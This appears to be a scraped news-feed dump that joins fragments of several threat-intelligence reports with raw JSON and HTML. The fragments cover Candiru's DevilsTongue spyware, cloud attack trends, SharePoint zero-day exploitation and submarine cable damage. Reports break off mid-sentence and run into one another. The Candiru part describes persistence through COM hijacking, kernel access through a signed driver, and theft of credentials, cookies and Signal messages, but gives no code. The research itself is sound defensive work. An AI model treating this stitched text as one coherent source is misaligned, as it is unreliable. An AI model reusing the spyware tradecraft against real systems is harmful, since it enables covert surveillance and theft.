linked to Candiru, led Insikt Group to identify the domain integrity-labs[.]ltd, registered on March 31, 2025. In this context, Insikt Group also identified a private Israeli company named Integrity Labs Ltd (אינטגריטי לאבס בע~מ), incorporated on December 18, 2024, under company number 517081089 and based in Herzliya, Israel. The company is directed by Naftali Yoran based on corporate report records attained by Recorded Future. Open-source reporting indicates that Elad Yoran is also known as Naftali Yoran.\nLicensing Model\nA leaked Candiru project proposal published by TheMarker, an Israeli news outlet, suggests that, similar to other spyware vendors like Intellexa, Candiru licenses its spyware according to the number of concurrent infections, which refers to the number of targets that can be actively monitored at any given moment. For example, one €16 million proposal allows for unlimited infection attempts but limits monitoring to ten devices simultaneously. Customers can expand this capacity: for an additional €1.5 million, they can monitor fifteen more devices and gain authorization to target one additional country; for €5.5 million, they can monitor 25 more devices and operate in five additional countries (see Figure 3). Another €1.5 million upgrade offers a remote shell capability, granting full command-line access to infected devices, raising particular concern due to its potential use for uploading files or planting incriminating content.\nFigure 3: Candiru pricing options (Source: Citizen Lab)\nThe leaked proposal further states that the product is intended to operate solely within “agreed upon territories,” explicitly listing the US, Russia, China, Israel, and Iran as restricted countries. Despite these limitations, Microsoft has identified Candiru victims in Iran and Israel, indicating that the spyware may, in certain cases, be deployed beyond its officially sanctioned regions. Corroborating this, the targeting infrastructure analyzed in Citizen Lab’s report from 2021 includes domains impersonating the Russian postal service. That report also details the targeting of a Catalan technologist while he was living in the US, as mentioned above.\nDevilsTongue\nDevilsTongue, the name given by Microsoft to the Windows-based spyware developed by Candiru, is a complex, modular, multi-threaded malware written in C and C++ with a wide range of capabilities. Most of what is known about DevilsTongue stems from Microsoft's analysis and a leaked Candiru project proposal published by TheMarker. However, given the extensive list of suspected components and features, and the age of both reports, Insikt Group assesses that the malware's capabilities have likely evolved since then.\nThe leaked documents reveal that Candiru’s spyware was designed for deep access to victim devices, enabling file extraction, browser data collection, and even the theft of encrypted messages from the Signal Messenger desktop app. Figure 4 presents an excerpt from the leaked Candiru project proposal outlining the spyware’s Windows-specific capabilities.\nFigure 4: Candiru’s capabilities on Windows devices (Source: Citizen Lab)\nAccording to Microsoft’s detailed analysis, DevilsTongue is a stealthy malware with both user- and kernel-mode components. It maintains persistence via COM hijacking by overwriting a legitimate COM class registry key’s DLL path with a first-stage DLL dropped in C:\\Windows\\system32\\IME\\, and it stores encrypted second-stage payloads in the configuration directory. A signed third-party driver (physmem.sys) enables kernel-level memory access and API call proxying to avoid detection. To preserve system stability, DevilsTongue reinjects the original COM DLL during hijacking, disguising this action through shellcode manipulation of the LoadLibraryExW return value. All additional payloads are decrypted and executed only in memory, allowing the malware to steal credentials from LSASS and browsers, access Signal messages, and use browser cookies to impersonate victims on platforms like Facebook, Gmail, and VK. The malware’s use of scrubbed metadata, encryption, and unique hashes for each file further complicates detection and analysis.\nOverlap with CHAINSHOT\nCHAINSHOT is an exploit kit that has previously been associated with Candiru. It has been observed in use by threat actor groups such as Stealth Falcon and SandCat, the latter believed to be linked to the Uzbek government. SandCat drew significant attention in 2019 due to a series of operational security errors that not only exposed multiple zero-day vulnerabilities but also enabled direct attribution to Uzbekistan’s State Security Service (SSS). Notably, another threat actor known as PuzzleMaker has also been mentioned in connection with CHAINSHOT, due to the use of a rare but likely not exclusively used technique. Although the connection between CHAINSHOT and Candiru was initially circumstantial, researchers at Citizen Lab later established a clearer link. They identified a shared fingerprint, including a matching IP address, that tied CHAINSHOT’s final spyware delivery URL to infrastructure documented in a 2018 report by Palo Alto Networks, thereby reinforcing the association between CHAINSHOT and Candiru.\nInitial Access Vectors\nAccording to the leaked materials discussed above, Candiru’s spyware can be deployed through multiple vectors, including malicious links, weaponized files, man-in-the-middle (MitM) attacks, and physical access. However, based on Insikt Group’s current knowledge, public reporting has only confirmed the use of the first two vectors in documented cases involving Candiru-related infections, although it is highly likely that the other vectors have also been employed. When it comes to malicious links, Candiru has used both actor-controlled links, such as spearphishing emails and strategic website compromises known as watering hole attacks, to deliver its spyware, with infections typically involving exploits that target web browsers (1, 2).\nFor instance, Google’s Threat Analysis Group (TAG) disclosed in 2021 that two Google Chrome renderer remote code execution zero-day vulnerabilities (CVE-2021-21166 and CVE-2021-30551) had been exploited by Candiru. These exploits were distributed via single-use links sent to specific targets, who were believed to be located in Armenia. The links directed recipients to attacker-controlled domains impersonating legitimate websites relevant to the victims’ interests. Google TAG discovered that CVE-2021-21166 also affected WebKit, prompting Apple to patch it as CVE-2021-1844; however, there is no evidence it was used against Safari users.\nIn April 2021, Google TAG identified a campaign targeting Armenian users with malicious Office documents that loaded web content through Internet Explorer. This was achieved either by embedding a remote ActiveX object using a Shell.Explorer.1 OLE object or by launching an Internet Explorer process via VBA macros to navigate to a web page. Following a fingerprinting phase, targets were served an Internet Explorer zero-day exploit, later assigned CVE-2021-33742 and patched by Microsoft in June 2021. TAG’s analysis indicates that the Internet Explorer exploits were developed and supplied by the same entity responsible for the previously mentioned Google Chrome exploits.\nIn July 2022, Avast reported that CVE-2022-2294, a high-severity heap buffer overflow vulnerability in WebRTC within Google Chrome, was exploited to execute shellcode in the browser’s renderer process, targeting users in the Middle East. The exploit, designed specifically for Windows, was likely combined with a sandbox escape, though the second-stage exploit could not be recovered. In Lebanon, the attackers compromised a website used by employees of a news agency, which contained signs of persistent cross-site scripting (XSS) attacks, likely as part of their testing phase, before ultimately injecting malicious JavaScript from an attacker-controlled domain. This injected code selectively redirected intended victims through a chain of attacker-controlled domains to the exploit server. Prior to Avast’s report, ESET had reported on strategic web compromises across the Middle East, with a strong focus on Yemen, that they attributed to Candiru with medium confidence.\nBeyond the previously mentioned vectors, reports from 2023 indicate that Candiru also possessed a capability known as Sherlock. Sherlock is a commercial surveillance capability developed by the Israeli software maker Insanet that is capable of infecting devices running Windows, Android, and iOS. Unlike traditional spyware that exploits software vulnerabilities, Sherlock leverages programmatic advertising to deliver its payload. By placing malicious ads through ad exchanges, it can target specific individuals based on demographics and location, leading to the covert installation of spyware when the ad is displayed on a user's device.\nTo read the entire analysis, click here to download the report as a PDF.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_1402ea756ce42ab4c59900b6004642ac03f13b79d.jpg?width=1200&format=pjpg&optimize=medium"},"content":"Recorded Future's Insikt Group uncovers active infrastructure linked to Candiru’s DevilsTongue spyware across multiple countries.

Additionally, the most common cloud platforms provide native services focused on security for cloud environments, such as web application firewalls (WAF), identity and access management (IAM) services, secrets storage and management suites, and secure data connectors for hybridized cloud environments, that allow cloud architects to mitigate the threats discussed in this report with relative ease</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Most initial compromises start with exposed or misconfigured cloud endpoints, with attackers using open‑source scanners to identify misconfigured endpoints.</li>\n          <li>Stolen or weak credentials, often gathered from initial access brokers (IABs) and previous malicious actions performed by the attacker, remain the fastest path to full‑tenant cloud takeover.</li>\n          <li>Threat actors increasingly abuse legitimate SaaS and IaaS resources, shifting costs to the owners of victimized environments and abusing resources to complicate the detection of follow-on malicious actions, such as phishing campaigns.</li>\n          <li>Ransomware groups have adopted cloud‑native tactics, encrypting S3 and Azure storage directly and disabling backups to maximize leverage.</li>\n          <li>Hybrid infrastructure lets attackers pivot seamlessly between on‑premise and multi‑cloud environments, so visibility and controls must extend beyond the cloud environment to the devices and services that access it.</li>\n        </ul>\n        <h2>Introduction</h2>\n        <p>During the past decade, a steady shift from traditional on-premise IT infrastructure to cloud-based infrastructure and hybrid cloud infrastructure has taken place. According to PwC’s <a href=\"https://www.pwc.com/us/en/services/audit-assurance/private-company-services/library/cloud-technology.html\">2023 Cloud Business Survey</a>, 39% of private respondents stated that the entirety of their operations had been moved to cloud environments. Cloud computing has become a trusted and integral part of many corporations’ day-to-day operations. Since the time of PwC’s reporting, cloud computing as an industry has only grown with no signs of slowing.</p>\n        <p>The breadth of cloud products and the depth of services provided by cloud environments continue to grow daily. In a joint <a href=\"https://www.aboutamazon.com/news/aws/ai-cloud-adoption-economic-impact-gdp-aws\">study</a> conducted by Amazon and Telecom Advisory Services, cloud adoption accounted for a total of $1 trillion in the global gross domestic product, with a projected increase to $12 trillion between 2024 and 2030. This estimate indicates that traditional computing environments will continue to migrate to cloud environments rapidly in the coming years. That demand for cloud computing resources will continue to increase for the foreseeable future.</p>\n        <p>The success of cloud computing can be squarely attributed to the benefits that adopters are provided. When properly configured, cloud environments allow their adopters to shift costs associated with traditional on-premise environments, create high-availability to remote assets, and eliminate development overhead by gaining access to managed services. As cloud providers continue to offer additional services and products that make similar offerings for traditional environments less effective from cost and operational perspectives, cloud adoption will only continue to grow in the future.</p>\n        <h2>Background</h2>\n        <p>Cloud technologies, platforms, and services are increasingly implemented into corporate structures, providing all of the benefits of traditional on-premise environments while reducing costs associated with an on-premise environment in nearly every conceivable way. This relationship was <a href=\"https://www.pwc.com/us/en/tech-effect/cloud/cloud-ai-business-survey.html\">demonstrated</a> in PwC’s “2024 Cloud and AI Business Survey,” which reported that, out of a survey of 1,000 companies that implemented cloud technologies, 74% of the surveyed companies that have optimized their cloud environments reported increased profitability, and 65% of the same respondents reported increased cost savings. While these benefits are highly appealing to corporations, cloud environments pose unique risks and security challenges, challenges that require a fresh approach to cybersecurity to mitigate properly.</p>\n        <p>The advancement of cloud environments has also increased the number of network-accessible endpoints that an organization must monitor and defend. In instances where large enterprise entities have fully migrated their operations to cloud environments, the endpoints required to facilitate user access, deploy web applications, support data transfer, and provide many other kinds of access on a day-to-day basis add up quickly and create a diverse boundary that is constantly interacting with the broader internet. The technologies that interface with and are embedded within this boundary pose unique risks and security challenges. Looking inward, similar issues persist, with cloud defenders requiring a fresh understanding of how cloud environments can be effectively architected to provide the benefits of a cloud environment without allowing undue access to sensitive information and control over mission-critical assets hosted in these environments.</p>\n        <p>As Insikt Group discusses in this report, threat actors have become increasingly aware of the security challenges cloud defenders must address, as well as the opportunities that cloud technologies, environments, and services afford them. The overwhelming amount of data, applications, systems, and other assets hosted on cloud environments, coupled with the task of defending these assets, provides threat actors with novel opportunities to compromise information, abuse environment resources, and profit from illicit activities in ways previously unattainable in on-premise environments. Additionally, threat actors have begun to understand the usefulness of cloud resources as part of an attack chain, realizing they are afforded all of the same benefits of legitimate cloud users, with the added benefits of anonymity and reduced detection capabilities in a way that is unobtainable with traditional infrastructure.</p>\n        <p>Understanding the threat posed by these adversaries, this report was created to shed light on the most impactful and emerging tactics, techniques, and procedures (TTPs) displayed by threat actors that target and abuse cloud environments. In doing so, it aims to provide an understanding of how threat actors are impacting and abusing cloud environments at a granular level, as well as how to mitigate these threats and hunt for indicators of compromise associated with them so that cloud defenders are better able to identify and respond when necessary.</p>\n        <h2>Methodology</h2>\n        <p>This report identified five main threats to cloud environments, each of which are explored their respective sections:</p>\n        <ul>\n          <li>Cloud Abuse</li>\n          <li>Exploitation</li>\n          <li>Endpoint Misconfiguration</li>\n          <li>Cloud Ransomware</li>\n          <li>Credential Abuse and Account Takeover</li>\n        </ul>\n        <p>Each section includes radar charts that measure the following attributes associated with a given threat.

In the radar chart, the higher the number, the more likely it is threat actors will be able to perform actions demonstrating this threat in ways previously unobserved, thus complicating detection of the behavior.</li>\n          <li><strong>Effort to Perform:</strong> What are the technical and monetary costs associated with performing this threat vector? In the radar chart, the higher the number, the greater the barrier for an attacker to demonstrate this threat against a cloud environment, generally in terms of monetary cost or technical capability</li>\n        </ul>\n        <h2>Threats To Cloud Environments</h2>\n        <h2>Cloud Abuse</h2>\n        <h3>Key Takeaways</h3>\n        <ul>\n          <li>Attackers registered their own cloud infrastructure to host malicious content and exfiltrate stolen data to their own cloud environments.</li>\n          <li>Uses for compromised cloud environments varied heavily and were determined by the responsible threat actor’s goal or proficiency.</li>\n        </ul>\n        <p><strong>Figure 1</strong> illustrates and compares attributes associated with cloud abuse.

In the former threat type, attackers must determine how to register for larger cloud platforms anonymously and conduct malicious actions without being detected, all while paying for the environment. In the latter threat type, threat actors are only able to abuse victim cloud infrastructure after adequately compromising cloud services and systems that are necessary for them to achieve their overarching goals.</p>\n        <h2>Threat Summary</h2>\n        <p>The term cloud abuse refers to two overarching behaviors threat actors have displayed when targeting cloud environments:</p>\n        <ul>\n          <li>Abuse of legitimate cloud infrastructure obtained by a threat actor to perform malicious activities</li>\n          <li>Abuse of legitimate cloud infrastructure owned by a victim a threat actor compromises to perform malicious activities</li>\n        </ul>\n        <p>In both instances, threat actors abuse legitimate cloud infrastructure for nefarious purposes; however, the behaviors demonstrated by threat actors in each of these scenarios differ significantly. In the former example, threat actors will mainly abuse these resources to appear as part of legitimate traffic and remain anonymous; this behavior is often used to carry out phishing campaigns, host malicious content, and act as part of the threat actor’s command-and-control (C2) infrastructure. In the latter example, threat actors may still abuse the cloud environment to masquerade as a legitimate entity, but they may also hijack the environment’s resources, shifting costs to the environment’s owner. In such an instance, additional actions such as cryptojacking and a more recent technique, LLMjacking, may occur and result in inflated monetary costs.</p>\n        <h2>Outlook</h2>\n        <p>Threat actors will almost certainly continue obtaining their own cloud infrastructure for several reasons:</p>\n        <ul>\n          <li>Threat actors are afforded all of the same benefits legitimate cloud users are provided, in addition to anonymizing factors that aid in malicious actions (see Figure 2).</li>\n          <li>It is relatively easy to obtain cloud infrastructure from CSPs without extensive scrutiny from the provider, allowing attackers to create extensive cloud environments without suspicion.</li>\n          <li>Abuse of legitimately registered cloud environments is often identified reactively following malicious actions originating from the environment, indicating that CSPs do not have a reliable method of detecting cloud abuse prior to victim compromise.</li>\n          <li>Threat actors are easily able to pivot from one cloud provider to another and are able to mask their identities while performing malicious actions when abusing cloud resource</li>\n        </ul>\n      ","content:encodedSnippet":"Executive Summary\nIn a review of recently observed attack methods, Insikt Group identified five attack vectors that currently pose the greatest potential threat to cloud environments.

In the latter threat type, threat actors are only able to abuse victim cloud infrastructure after adequately compromising cloud services and systems that are necessary for them to achieve their overarching goals.\nThreat Summary\nThe term cloud abuse refers to two overarching behaviors threat actors have displayed when targeting cloud environments:\nAbuse of legitimate cloud infrastructure obtained by a threat actor to perform malicious activities\nAbuse of legitimate cloud infrastructure owned by a victim a threat actor compromises to perform malicious activities\nIn both instances, threat actors abuse legitimate cloud infrastructure for nefarious purposes; however, the behaviors demonstrated by threat actors in each of these scenarios differ significantly. In the former example, threat actors will mainly abuse these resources to appear as part of legitimate traffic and remain anonymous; this behavior is often used to carry out phishing campaigns, host malicious content, and act as part of the threat actor’s command-and-control (C2) infrastructure. In the latter example, threat actors may still abuse the cloud environment to masquerade as a legitimate entity, but they may also hijack the environment’s resources, shifting costs to the environment’s owner. In such an instance, additional actions such as cryptojacking and a more recent technique, LLMjacking, may occur and result in inflated monetary costs.\nOutlook\nThreat actors will almost certainly continue obtaining their own cloud infrastructure for several reasons:\nThreat actors are afforded all of the same benefits legitimate cloud users are provided, in addition to anonymizing factors that aid in malicious actions (see Figure 2).\nIt is relatively easy to obtain cloud infrastructure from CSPs without extensive scrutiny from the provider, allowing attackers to create extensive cloud environments without suspicion.\nAbuse of legitimately registered cloud environments is often identified reactively following malicious actions originating from the environment, indicating that CSPs do not have a reliable method of detecting cloud abuse prior to victim compromise.\nThreat actors are easily able to pivot from one cloud provider to another and are able to mask their identities while performing malicious actions when abusing cloud resource","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_1ce7a8761a9dbed3f2f53282ed5e139ea8455967e.jpg?width=1200&format=pjpg&optimize=medium"},"content":"Explore top cloud threats in 2025.

These are Linen Typhoon (which historically overlaps with TAG-67 as tracked by Recorded Future), Violet Typhoon (which historically overlaps with RedBravo as tracked by Recorded Future), and Storm-2603. The actors exploited CVE-2025-49704 (RCE) and CVE-2025-49706 (spoofing) to compromise on-premises SharePoint servers, with additional vulnerabilities CVE-2025-53770 and CVE-2025-53771 affecting previously patched systems.\nLinen Typhoon has been known to exploit zero-day and n-day vulnerabilities for initial access, and to exploit known vulnerabilities years after they were initially disclosed. For example, in 2021, the threat group exploited a zero-day vulnerability in Zoho AdSelf Service Plus.\nChinese threat groups have increasingly adopted internet-facing appliance exploitation as a scalable initial access strategy, allowing them to establish footholds across numerous organizations simultaneously.\nInsikt Group® assesses at this stage that it is likely that multiple other threat groups beyond Linen Typhoon, Violet Typhoon, and Storm-2603 will actively seek to exploit on-premise SharePoint instances, especially following the public release of proof-of-concept exploit code.\nOur intelligence indicates that the current campaign represents an early phase of what will likely become a prolonged exploitation effort. We will continue to monitor and analyze the threat in real time and will share any updates on intelligence and mitigation strategies as they become available.","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/blog/media_1a1c1d85bd35aae319aa4901d902585928a1f5c1e.jpg?width=1200&format=pjpg&optimize=medium"},"content":"A zero-day exploit chain—ToolShell—targets on-prem Microsoft SharePoint servers via CVE-2025-53770 & CVE-2025-53771.

Insikt Group’s assessment of the current risk environment for submarine cables aligns with the findings of our 2023 assessment, which highlighted the convergence of geopolitical, physical, and cyber threats. Based on an analysis of 44 publicly reported cable damages occurring in 32 distinct groupings in 2024 and 2025 (Appendix A), Insikt Group assesses that three factors in the submarine cable ecosystem –– lack of redundancy in cable networks, lack of diversity of cable routes, and limited global repair capacity –– very likely increase the likelihood of significant outages from damages. Regions with low redundancy, such as parts of West and Central Africa, isolated Pacific islands, and certain secondary European routes, are more likely to suffer disproportionate impact from cable damage, especially when geopolitical tensions coincide with infrastructure constraints.</p>\n        <p>While accidents will very likely continue to cause the majority of day-to-day interruptions, recent incidents in the Baltic Sea and around Taiwan indicate that submarine cable systems remain vulnerable to threats such as anchor dragging, which states can use as a low-sophistication tactic to target adversaries’ critical infrastructure while maintaining plausible deniability. Insikt Group identified four incidents involving eight distinct cable damages in the Baltic Sea and five incidents involving five distinct cable damages around Taiwan in 2024 and 2025. At least five of these nine incidents were attributed to ships dragging their anchors, including four Russia- or China-linked vessels operating under suspicious circumstances or with opaque ownership structures, although the resulting investigations have highlighted the difficulty of attributing cable cuts to state-sponsored sabotage. Such campaigns attributed to Russia in the North Atlantic–Baltic region and China in the western Pacific are likely to increase in frequency as tensions rise, leveraging deniable tactics in both shallow and deep water to apply political pressure without overt escalation.</p>\n        <p>Without a significant expansion of dedicated repair vessels, repair capacity is very likely to lag behind demand, pushing median restoration times beyond the current 40‑day benchmark. National permitting delays and conflict zone access restrictions will likely extend repair times further, making streamlined diplomatic clearance processes an increasingly critical element of submarine cable resilience. Satellite and microwave links will almost certainly remain partial stop‑gaps, restoring only a fraction of lost bandwidth during major outages. To mitigate these challenges, joint public-private partnerships investing in repair and maintenance capabilities, improving real-time monitoring and security measures around submarine cable infrastructure, and conducting comprehensive stress tests are critical to improving resilience and guarding against a low-probability but high-impact event in which damages to multiple cables cause prolonged connectivity issues.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Insikt Group identified a total of 44 publicly reported cable damages in 2024 and 2025 occurring in 32 distinct groupings. Unknown causes accounted for the largest number of damages (31%), followed by anchor dragging (25%) and seismic activity or other natural phenomena (16%).</li>\n          <li>Of the identified cable damages, three caused significant and prolonged outages. These cases indicate that three factors –– lack of redundancy, lack of diversity of cable routes, and limited repair capacity –– very likely raise the risk of severe impact from damages to submarine cables.</li>\n          <li>Insikt Group identified four incidents in the Baltic Sea involving eight distinct submarine cable damages and five incidents around Taiwan involving five distinct submarine cable damages in 2024 and 2025, four of which involved China- or Russia-linked vessels with opaque ownership or suspicious maneuvers near the damaged cables.</li>\n          <li>Geopolitical tensions –– namely, Russia’s war against Ukraine and China’s coercive actions toward Taiwan –– very likely remain the primary drivers of state-linked sabotage activity targeting submarine cables.</li>\n          <li>Joint public-private partnerships promoting investment in cable repair and maintenance capabilities, enhancing security and surveillance of critical submarine infrastructure, and improving resilience in current and future cable networks will be critical to addressing rising threats to cable infrastructure.</li>\n        </ul>\n        <h2>Background</h2>\n        <p>There are <a href=\"https://submarine-cable-map-2025.telegeography.com/\">currently</a> 597 subsea cables in operation or under construction as of April 2025, <a href=\"https://submarine-cable-map-2024.telegeography.com/\">compared</a> to 559 subsea cables in 2024.

Most of these faults never <a href=\"https://blog.telegeography.com/what-to-know-about-submarine-cable-breaks\">reach</a> the threshold of public reporting, since the majority do not cause detectable issues due to the availability of alternate routes for traffic. From 2015 to 2024, SubTel Forum <a href=\"https://subtelforum.com/submarine-telecoms-industry-report/\">identified</a> a total of 237 publicized cable fault incidents globally –– likely a fraction of the total cable faults –– the vast majority of which were attributable to human activities, namely fishing and anchor dragging. Regionally, the “AustralAsia” region <a href=\"https://subtelforum.com/submarine-telecoms-industry-report/\">accounted</a> for 36.3% of all reported faults during this period, making it the most fault-prone area, followed by Europe, the Middle East, and Africa (28.7%) and the Americas (20.3%) The ICPC <a href=\"https://www.iscpc.org/publications/submarine-cable-protection-and-the-environment/\">reports</a> that the most common cause of cable damage is a ship anchor or fishing equipment contacting a cable in depths of less than 200 meters. Undersea abrasion and natural phenomena –– such as underwater rockslides and seismic activity –– <a href=\"https://www.kentik.com/blog/diving-deep-into-submarine-cables-undersea-lifelines-of-internet-connectivity/\">account</a> for approximately 10% of faults.</p>\n        <p>While cable faults are relatively common, they require significant resources to repair; the ICPC <a href=\"https://www.csis.org/analysis/safeguarding-subsea-cables-protecting-cyber-infrastructure-amid-great-power-competition\">reports</a> that cable repairs average between $1 and $3 million, require “specialized cable ships with highly trained crews,” and can take months to complete.</p>\n        <h2>Submarine Cable Risk Environment</h2>\n        <p>Submarine cable systems very likely continue to face an escalating risk environment, driven in part by increasing geopolitical tensions –– aligning with our July 2023 <a href=\"/research/escalating-global-risk-environment-submarine-cables\">assessment</a>. In 2024, SubTel Forum –– a leading industry platform for submarine cable analysis and reporting –– reported 46 incidents, the highest figure since it began publishing data on subsea cable faults in 2013 and a sharp uptick from the fifteen reported in 2023. This corresponds to heightened public awareness of submarine cable vulnerabilities amid several recent high-profile damages and related concerns about intentional malicious actions, such as sabotage –– although the increase may be partially attributable to increased reporting on subsea cable faults, as opposed to strictly reflecting an increase in incidents. However, most recent incidents have not resulted in prolonged connectivity disruptions.</p>\n        <p>An assessment of the three most impactful damages in 2024 and 2025 –– located in the Red Sea, West Africa, and South Africa –– indicates that the greatest threat to submarine cables is almost certainly where damages occur in areas with limited redundancy and repair capacity, regardless of whether the result of malicious targeting driven by geopolitical interests, unintentional human activity, or natural phenomena.</p>\n        <h3>Most Impactful Cable Damages of 2024–2025</h3>\n        <p>Insikt Group identified 44 publicly reported submarine cable damages occurring in 32 groupings in 2024 and 2025 (<strong>Appendix A</strong>). Of these, three cases caused damage to multiple submarine internet cables resulting in substantial and prolonged disruption to internet and telecommunications traffic. In each case, disruption to services resulted from damages to multiple submarine cables at once, with the most impacted countries lacking reliable alternative routes for traffic, exacerbated by limited repair capabilities and permitting issues that prolonged repair timelines.</p>\n        <ul>\n          <li>In February 2024, a UK-owned vessel struck by a Houthi-fired missile sank in the Red Sea, damaging the Asia Africa Europe-1 (AAE-1), Europe India Gateway (EIG), and SEACOM cables and <a href=\"https://www.kentik.com/blog/what-caused-the-red-sea-submarine-cable-cuts/\">disrupting</a> 25% of traffic between Asia, Europe, and the Middle East. According to Hong Kong telecommunications company HGC Global Communications, the damage <a href=\"https://www.hgc.com.hk/press-releases/statement-hgc-global-communications-takes-swift-action-in-response-to-submarine-cable-damage-in-the-red-sea\">caused</a> “a significant impact on communication networks in the Middle East.”</li>\n          <li>In March 2024, an underwater rock slide <a href=\"https://www.internetsociety.org/resources/doc/2024/2024-west-africa-submarine-cable-outage-report/\">damaged</a> four submarine cables off West Africa: the West African Cable System (WACS), Africa Coast to Europe (ACE), MainOne, and SAT-3 cables. NetBlocks reported disruptions to internet connections in at least sixteen Central and West African countries, with disruptions to mobile payments and cloud applications for several days. CloudFlare <a href=\"https://blog.cloudflare.com/undersea-cable-failures-cause-internet-disruptions-across-africa-march-14-2024/\">reported</a> a significant impact on a total of thirteen countries. In Liberia, disruptions lasted more than twelve hours. The outage also <a href=\"https://punchng.com/submarine-cable-repairs-may-last-five-weeks-mainone/\">left</a> multiple Nigerian banks offline, severely <a href=\"https://www.bbc.com/news/world-africa-68569022\">impacted</a> connectivity in Ghana, and <a href=\"https://subtelforum.com/8m-to-restore-subsea-cable-services/\">incurred</a> estimated repair costs of $8 million.</li>\n          <li>In May 2024, damage to two cables off the coast of South Africa –– SEACOM and the Eastern Africa Submarine System (EASSy) –– significantly <a href=\"https://www.internetsociety.org/resources/doc/2024/2024-east-africa-submarine-cable-outage-report/\">reduced</a> connectivity between East and South Africa, and caused internet outages for Kenya and several other East African countries. According to <a href=\"https://x.com/netblocks/status/1790043208811954435\">Netblocks</a>, the cut disrupted internet services in twelve countries, with Tanzania, Mozambique, and Malawi particularly affected.</li>\n        </ul>\n        <h3>Risk Factors for Submarine Cable Systems</h3>\n        <p>Three primary factors –– lack of redundancy, lack of diversity of cable routes, and limited repair capacity –– very likely raise the likelihood of severe outages caused by damage to submarine cables. Additionally, permitting issues stemming from different regulatory environments and geopolitical tensions can extend the timeline for cable repairs, as can kinetic conflicts in the vicinity of cable breaks.</p>\n        <h4>Lack of Redundancy</h4>\n        <p><strong>Jurisdictions with limited alternate options to reroute traffic are most vulnerable to prolonged or significant disruptions.</strong> Following the May 2024 damages to SEACOM and EASSy, Kenya rerouted traffic to the TEAMS cable, with Safaricom and Airtel reporting they had activated alternative connectivity, but Tanzania experienced greater disruption due to its fewer connectivity options (<strong>Figure 2</strong>). In this case, the earlier February 2024 Red Sea damages further limited alternate options for connectivity, with Microsoft <a href=\"https://www.connectingafrica.com/connectivity/multiple-cable-failures-impact-africa-s-internet\">stating</a> that the two incidents together “had reduced the total network capacity for most of Africa’s regions.” By contrast, Cloudflare <a href=\"https://blog.cloudflare.com/resilient-internet-connectivity-baltic-cable-cuts/\">reported</a> that two cable cuts in November 2024 in the Baltic Sea –– the BCS East-West Interlink connecting Sweden and Lithuania, and the C-Lion1 cable connecting Finland and Germany –– “resulted in little-to-no observable impact to the affected countries … in large part because of the significant redundancy and resilience of Internet infrastructure in Europe.” Highlighting the importance of redundancy measures, the European Commission <a href=\"https://digital-strategy.ec.europa.eu/en/library/recommendation-security-and-resilience-submarine-cable-infrastructures\">reported</a> in 2024 that “many islands in the Union, including the three island Member States [Cyprus, Ireland, and Malta], as well as the EU outermost regions and overseas countries and territories, are almost entirely dependent on such submarine cables for intra-Union communications,” indicating a likely higher level of vulnerability.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"submarine-cables-002.jpg\" src=\"https://www.recordedfuture.com/media_18a2faaba7c667e2de1411c4dd6cb1764395c69a4.jpg?width=750&amp;format=jpg&amp;optimize=medium\" width=\"1600\" height=\"898\" />\n            </div>\n          </div>\n          <div>\n            <div><em>Figure 2: Impact of May 2024 SEACOM and EASSy cable outages in East Africa (Source:</em> <em><a href=\"https://x.com/netblocks/status/1789660992902730235\">NetBlocks</a>)</em></div>\n          </div>\n        </div>\n        <p><strong>While satellites provide edge connectivity and connect locations that do not have easy access to physical infrastructure, they account for a small amount of overall global capacity and typically cannot replace fiber-optic submarine cables, which also</strong> <strong><a href=\"https://theconversation.com/in-our-wi-fi-world-the-internet-still-depends-on-undersea-cables-49936\">move</a></strong> <strong>large amounts of data faster and more cheaply.</strong> TeleGeography <a href=\"https://www2.telegeography.com/submarine-cable-faqs-frequently-asked-questions\">reports</a> that “cables can carry far more data at far less cost than satellites,” and only a small percentage of intercontinental data traffic is transmitted via satellite, according to <a href=\"https://blog.cloudflare.com/undersea-cable-failures-cause-internet-disruptions-across-africa-march-14-2024/\">Cloudflare</a>. For example, the US Federal Communications Commission (FCC) <a href=\"https://www.fcc.gov/circuit-status-report\">reports</a> that satellites account for just 0.37% of all US international capacity. According to the <a href=\"https://www.iscpc.org/information/frequently-asked-questions/\">ICPC</a>, “a trans-pacific fibre-optic call need only travel about 5,000 miles point-to-point,” compared to a satellite call, which must travel 22,235 miles from the Earth to a satellite and then another 22,235 back. Illustrating this, a backup microwave system was <a href=\"https://www.enisa.europa.eu/publications/undersea-cables\">activated</a> following damages to two submarine cables connecting Taiwan and the Matsu Islands in February 2023, but only restored an estimated 5% of the bandwidth that the cables had provided, with full internet access not restored until April 2023.</p>\n        <h4>Lack of Diversity of Cable Routes</h4>\n        <p><strong>Deploying submarine cables along similar geographic routes very likely increases systemic risk by creating single points of failure.</strong> Countries with multiple submarine cables routed along varying geographic routes are more insulated from major connectivity losses; conversely, those with fewer connecting cables, placed in close proximity to each other, are almost certainly more susceptible to multiple cable damages and associated disruptions. Recent incidents of damage to multiple cables at once indicate that threat actors could attempt to exploit the concentration of cables along similar routes in an effort to cause prolonged outages across a geographic area. For example, the Red Sea cable cuts in February 2024, detailed above, illustrated the importance of route diversity. The March 2024 damages to four cables off West Africa, which all occurred due to an underwater landslide in the “Le Trou Sans Fond” canyon off of Côte d’Ivoire, <a href=\"https://www.internetsociety.org/resources/doc/2024/2024-west-africa-submarine-cable-outage-report/\">illustrated</a> how a concentration of cables at one point can make multiple cables susceptible to human-made threats or, as in this case, natural phenomena (<strong>Figure 3</strong>). Similarly, Egypt is a critical internet chokepoint through which multiple submarine cables <a href=\"https://www.kentik.com/blog/outage-in-egypt-impacted-aws-gcp-and-azure-interregional-connectivity/\">connecting</a> Europe, Africa, and Asia run; the vulnerabilities associated with this arrangement were <a href=\"https://blog.cloudflare.com/aae-1-smw5-cable-cuts/\">apparent</a> <a href=\"https://www.datacenterdynamics.com/en/news/aae-1-cable-cut-causes-widespread-outages-in-europe-east-africa-middle-east-and-south-asia/\">following</a> June 2022 damages to both the AAE-1 and the SeaMeWe-5 cables. In December 2024, the US Department of Homeland Security <a href=\"https://www.dhs.gov/sites/default/files/2024-12/24_1218_scrc_Priorities-for-DHS-Engagement-on-Subsea-Cable-Security-Resilience_18-Dec-24.pdf\">noted</a> that “while 